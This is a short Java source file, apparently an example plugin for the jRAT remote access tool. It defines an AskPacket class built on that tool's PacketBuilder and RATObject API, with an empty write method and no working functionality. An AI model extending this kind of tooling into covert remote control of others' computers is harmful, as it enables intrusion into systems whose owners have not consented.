package pro.jrat.client;

import java.io.DataInputStream;
import java.io.DataOutputStream;

import pro.jrat.api.PacketBuilder;
import pro.jrat.api.RATObject;

public class AskPacket extends PacketBuilder {

	public AskPacket(RATObject rat) {
		super(ExampleClientPlugin.HEADER, rat);
	}

	@Override
	public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {
		
	}

}
